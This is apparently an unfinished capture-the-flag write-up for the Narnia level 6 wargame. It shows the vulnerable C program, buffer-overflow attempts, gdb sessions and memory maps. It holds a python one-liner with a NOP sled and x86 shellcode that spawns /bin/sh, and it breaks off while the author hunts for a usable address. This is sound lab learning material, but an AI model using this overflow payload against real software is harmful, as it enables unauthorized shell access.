==================== Source ==============================
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

extern char **environ;

// tired of fixing values...
// - morla
unsigned long get_sp(void) {
       __asm__("movl %esp,%eax\n\t"
               "and $0xff000000, %eax"
               );
}

int main(int argc, char *argv[]){
	char b1[8], b2[8];
	int  (*fp)(char *)=(int(*)(char *))&puts, i;

	if(argc!=3){ printf("%s b1 b2\n", argv[0]); exit(-1); }

	/* clear environ */
	for(i=0; environ[i] != NULL; i++)
		memset(environ[i], '\0', strlen(environ[i]));
	/* clear argz    */
	for(i=3; argv[i] != NULL; i++)
		memset(argv[i], '\0', strlen(argv[i]));

	strcpy(b1,argv[1]);
	strcpy(b2,argv[2]);
	//if(((unsigned long)fp & 0xff000000) == 0xff000000)
	if(((unsigned long)fp & 0xff000000) == get_sp())
		exit(-1);
	fp(b1);

	exit(1);
}
=============================================================
I'm gonna try to overflow b2 
narnia6@narnia:~$ /narnia/narnia6 B1 B2                                          
B1
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*12')
AAAA
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*15')
AAAAAAA
narnia6@narnia:~$ /narnia/narnia6 B1 $(python -c'print "A"*16')
Segmentation fault (core dumped)

Oh! Let's fire up GDB

(gdb) run B1 $(python -c'print "A"*16')
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16')

Program received signal SIGSEGV, Segmentation fault.
0x08048301 in ?? ()
(gdb) run B1 $(python -c'print "A"*20')
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*20')

Program received signal SIGSEGV, Segmentation fault.
0x41414141 in ?? ()

Nice! Now, where to point?

Let's see where this is actually happening, after a bit of fiddling with gdb we get this:
0x08048558 in get_sp ()
(gdb) 
0x08048697 in main ()
(gdb) 
0x08048699 in main ()
(gdb) 
0x080486a7 in main ()
(gdb) 
0x080486ab in main ()
(gdb) 
0x080486ae in main ()
(gdb) 
0x080486b2 in main ()
(gdb) 
0x41414141 in ?? ()
(gdb) 

Corresponds to this:

 8048692:	e8 b6 fe ff ff       	call   804854d <get_sp>
 8048697:	39 c3                	cmp    %eax,%ebx
 8048699:	75 0c                	jne    80486a7 <main+0x14e>
 804869b:	c7 04 24 ff ff ff ff 	movl   $0xffffffff,(%esp)
 80486a2:	e8 69 fd ff ff       	call   8048410 <exit@plt>
 80486a7:	8d 44 24 20          	lea    0x20(%esp),%eax
 80486ab:	89 04 24             	mov    %eax,(%esp)
 80486ae:	8b 44 24 28          	mov    0x28(%esp),%eax
 80486b2:	ff d0                	call   *%eax

=============== Road block ===========================
My plan is to make the buffer bigger and pop the shellcode in there... but, as with anything else, there are issues.
Notably that if statement that makes the program exit with -1 when we throw the return address starting with ff, see below:

(gdb) run B1 $(python -c'print "A"*16+"\x3c\xd6\xff\xff"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')
Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16+"\x3c\xd6\xff\xff"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x08048558 in get_sp ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048697 in main ()
(gdb) x/100x $esp
0xffffd600:	0xffffd618	0xffffd81c	0x00000021	0x08048712
0xffffd610:	0x00000003	0xffffd6d4	0x41414141	0x41414141
0xffffd620:	0x41414141	0x41414141	0xffffd63c	0x90909090
0xffffd630:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd640:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd650:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd660:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd670:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd680:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd690:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6a0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6b0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6c0:	0x90909090	0x90909090	0x90909090	0x90909090
0xffffd6d0:	0x90909090	0x90909090	0x31909090	0x2f6850c0
0xffffd6e0:	0x6868732f	0x6e69622f	0x5350e389	0xc289e189
0xffffd6f0:	0x80cd0bb0	0xffffd900	0xffffd958	0xffffd965
0xffffd700:	0xffffde86	0xffffde91	0xffffde9c	0xffffdefa
0xffffd710:	0xffffdf11	0xffffdf20	0xffffdf32	0xffffdf43
0xffffd720:	0xffffdf4c	0xffffdf5f	0xffffdf67	0xffffdf77
0xffffd730:	0xffffdfa6	0xffffdfc6	0x00000000	0x00000020
0xffffd740:	0xf7fdbbe0	0x00000021	0xf7fdb000	0x00000010
0xffffd750:	0x178bfbff	0x00000006	0x00001000	0x00000011
0xffffd760:	0x00000064	0x00000003	0x08048034	0x00000004
0xffffd770:	0x00000020	0x00000005	0x00000008	0x00000007
0xffffd780:	0xf7fdc000	0x00000008	0x00000000	0x00000009
(gdb) si
0x08048699 in main ()
(gdb) si
0x0804869b in main ()
(gdb) si
0x080486a2 in main ()
(gdb) 
0x08048410 in exit@plt ()
(gdb) 
0x08048416 in exit@plt ()
(gdb) 
0x0804841b in exit@plt ()
(gdb) 
0x080483c0 in ?? ()
(gdb) 
0x080483c6 in ?? ()


As we can see the execution flow above is different from what we see below with BBBB as the value passed to eip:


(gdb) run B1 $(python -c'print "A"*16+"BBBB"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"') 
The program being debugged has been started already.
Start it from the beginning? (y or n) y

Starting program: /narnia/narnia6 B1 $(python -c'print "A"*16+"BBBB"+"\x90"*175+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x89\xc2\xb0\x0b\xcd\x80"')

Breakpoint 1, 0x08048558 in get_sp ()
(gdb) c
Continuing.

Breakpoint 2, 0x08048697 in main ()
(gdb) c
Continuing.

Breakpoint 3, 0x080486b2 in main ()
(gdb) c  
Continuing.

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()

Now I have to figure out how to trick the get_sp() function into letting me through.... or throw the shellcode into and address space not starting with ff.

========================== Address Space =============================
Trying to figure out where to put this shell.... let's see what's in /proc/$pid/maps

narnia6@narnia:/proc/488$ cat maps
00400000-00962000 r-xp 00000000 00:112 772                               /usr/bin/gdb
00b61000-00b62000 r--p 00561000 00:112 772                               /usr/bin/gdb
00b62000-00b75000 rw-p 00562000 00:112 772                               /usr/bin/gdb
00b75000-00df0000 rw-p 00000000 00:00 0                                  [heap]
7ffff5bfb000-7ffff5c3b000 rw-p 00000000 00:00 0 
7ffff5c7b000-7ffff5dbb000 rw-p 00000000 00:00 0 
7ffff5dbb000-7ffff5dbd000 r-xp 00000000 00:112 80                        /lib/x86_64-linux-gnu/libutil-2.19.so
7ffff5dbd000-7ffff5fbc000 ---p 00002000 00:112 80                        /lib/x86_64-linux-gnu/libutil-2.19.so
7ffff5fbc000-7ffff5fbd000 r--p 00001000 00:112 80                        /lib/x86_64-linux-gnu/libutil-2.19.so
7ffff5fbd000-7ffff5fbe000 rw-p 00002000 00:112 80                        /lib/x86_64-linux-gnu/libutil-2.19.so
7ffff5fbe000-7ffff617c000 r-xp 00000000 00:112 31                        /lib/x86_64-linux-gnu/libc-2.19.so
7ffff617c000-7ffff637b000 ---p 001be000 00:112 31                        /lib/x86_64-linux-gnu/libc-2.19.so
7ffff637b000-7ffff637f000 r--p 001bd000 00:112 31                        /lib/x86_64-linux-gnu/libc-2.19.so
7ffff637f000-7ffff6381000 rw-p 001c1000 00:112 31                        /lib/x86_64-linux-gnu/libc-2.19.so
7ffff6381000-7ffff6386000 rw-p 00000000 00:00 0 
7ffff6386000-7ffff63a7000 r-xp 00000000 00:112 2205                      /lib/x86_64-linux-gnu/liblzma.so.5.0.0
7ffff63a7000-7ffff65a6000 ---p 00021000 00:112 2205                      /lib/x86_64-linux-gnu/liblzma.so.5.0.0
7ffff65a6000-7ffff65a7000 r--p 00020000 00:112 2205                      /lib/x86_64-linux-gnu/liblzma.so.5.0.0
7ffff65a7000-7ffff65a8000 rw-p 00021000 00:112 2205                      /lib/x86_64-linux-gnu/liblzma.so.5.0.0
7ffff65a8000-7ffff65cf000 r-xp 00000000 00:112 1884                      /lib/x86_64-linux-gnu/libexpat.so.1.6.0
7ffff65cf000-7ffff67cf000 ---p 00027000 00:112 1884                      /lib/x86_64-linux-gnu/libexpat.so.1.6.0
7ffff67cf000-7ffff67d1000 r--p 00027000 00:112 1884                      /lib/x86_64-linux-gnu/libexpat.so.1.6.0
7ffff67d1000-7ffff67d2000 rw-p 00029000 00:112 1884                      /lib/x86_64-linux-gnu/libexpat.so.1.6.0
7ffff67d2000-7ffff6b5e000 r-xp 00000000 00:112 2203                      /usr/lib/x86_64-linux-gnu/libpython3.4m.so.1.0
7ffff6b5e000-7ffff6d5d000 ---p 0038c000 00:112 2203                      /usr/lib/x86_64-linux-gnu/libpython3.4m.so.1.0
7ffff6d5d000-7ffff6d5f000 r--p 0038b000 00:112 2203                      /usr/lib/x86_64-linux-gnu/libpython3.4m.so.1.0
7ffff6d5f000-7ffff6deb000 rw-p 0038d000 00:112 2203                      /usr/lib/x86_64-linux-gnu/libpython3.4m.so.1.0
7ffff6deb000-7ffff6e07000 rw-p 00000000 00:00 0 
7ffff6e07000-7ffff6e20000 r-xp 00000000 00:112 78                        /lib/x86_64-linux-gnu/libpthread-2.19.so
7ffff6e20000-7ffff701f000 ---p 00019000 00:112 78                        /lib/x86_64-linux-gnu/libpthread-2.19.so
7ffff701f000-7ffff7020000 r--p 00018000 00:112 78                        /lib/x86_64-linux-gnu/libpthread-2.19.so
7ffff7020000-7ffff7021000 rw-p 00019000 00:112 78                        /lib/x86_64-linux-gnu/libpthread-2.19.so
7ffff7021000-7ffff7025000 rw-p 00000000 00:00 0 
7ffff7025000-7ffff712a000 r-xp 00000000 00:112 84                        /lib/x86_64-linux-gnu/libm-2.19.so
7ffff712a000-7ffff7329000 ---p 00105000 00:112 84                        /lib/x86_64-linux-gnu/libm-2.19.so
7ffff7329000-7ffff732a000 r--p 00104000 00:112 84                        /lib/x86_64-linux-gnu/libm-2.19.so
7ffff732a000-7ffff732b000 rw-p 00105000 00:112 84                        /lib/x86_64-linux-gnu/libm-2.19.so
7ffff732b000-7ffff7343000 r-xp 00000000 00:112 82                        /lib/x86_64-linux-gnu/libz.so.1.2.8
7ffff7343000-7ffff7542000 ---p 00018000 00:112 82                        /lib/x86_64-linux-gnu/libz.so.1.2.8
7ffff7542000-7ffff7543000 r--p 00017000 00:112 82                        /lib/x86_64-linux-gnu/libz.so.1.2.8
7ffff7543000-7ffff7544000 rw-p 00018000 00:112 82                        /lib/x86_64-linux-gnu/libz.so.1.2.8
7ffff7544000-7ffff7569000 r-xp 00000000 00:112 36                        /lib/x86_64-linux-gnu/libtinfo.so.5.9
7ffff7569000-7ffff7768000 ---p 00025000 00:112 36                        /lib/x86_64-linux-gnu/libtinfo.so.5.9
7ffff7768000-7ffff776c000 r--p 00024000 00:112 36                        /lib/x86_64-linux-gnu/libtinfo.so.5.9
7ffff776c000-7ffff776d000 rw-p 00028000 00:112 36                        /lib/x86_64-linux-gnu/libtinfo.so.5.9
7ffff776d000-7ffff778f000 r-xp 00000000 00:112 2202                      /lib/x86_64-linux-gnu/libncurses.so.5.9
7ffff778f000-7ffff798e000 ---p 00022000 00:112 2202                      /lib/x86_64-linux-gnu/libncurses.so.5.9
7ffff798e000-7ffff798f000 r--p 00021000 00:112 2202                      /lib/x86_64-linux-gnu/libncurses.so.5.9
7ffff798f000-7ffff7990000 rw-p 00022000 00:112 2202                      /lib/x86_64-linux-gnu/libncurses.so.5.9
7ffff7990000-7ffff7993000 r-xp 00000000 00:112 38                        /lib/x86_64-linux-gnu/libdl-2.19.so
7ffff7993000-7ffff7b92000 ---p 00003000 00:112 38                        /lib/x86_64-linux-gnu/libdl-2.19.so
7ffff7b92000-7ffff7b93000 r--p 00002000 00:112 38                        /lib/x86_64-linux-gnu/libdl-2.19.so
7ffff7b93000-7ffff7b94000 rw-p 00003000 00:112 38                        /lib/x86_64-linux-gnu/libdl-2.19.so
7ffff7b94000-7ffff7bd1000 r-xp 00000000 00:112 2200                      /lib/x86_64-linux-gnu/libreadline.so.6.3
7ffff7bd1000-7ffff7dd1000 ---p 0003d000 00:112 2200                      /lib/x86_64-linux-gnu/libreadline.so.6.3
7ffff7dd1000-7ffff7dd3000 r--p 0003d000 00:112 2200                      /lib/x86_64-linux-gnu/libreadline.so.6.3
7ffff7dd3000-7ffff7dd9000 rw-p 0003f000 00:112 2200                      /lib/x86_64-linux-gnu/libreadline.so.6.3
7ffff7dd9000-7ffff7dda000 rw-p 00000000 00:00 0 
7ffff7dda000-7ffff7dfd000 r-xp 00000000 00:112 28                        /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7e37000-7ffff7fef000 rw-p 00000000 00:00 0 
7ffff7ff4000-7ffff7ff8000 rw-p 00000000 00:00 0 
7ffff7ff8000-7ffff7ffa000 r--p 00000000 00:00 0                          [vvar]
7ffff7ffa000-7ffff7ffc000 r-xp 00000000 00:00 0                          [vdso]
7ffff7ffc000-7ffff7ffd000 r--p 00022000 00:112 28                        /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7ffd000-7ffff7ffe000 rw-p 00023000 00:112 28                        /lib/x86_64-linux-gnu/ld-2.19.so
7ffff7ffe000-7ffff7fff000 rw-p 00000000 00:00 0 
7ffffffde000-7ffffffff000 rw-p 00000000 00:00 0                          [stack]
ffffffffff600000-ffffffffff601000 r-xp 00000000 00:00 0                  [vsyscall]

So the only space not starting with ff which is not gdb is:
00b75000-00df0000 rw-p 00000000 00:00 0                                  [heap]

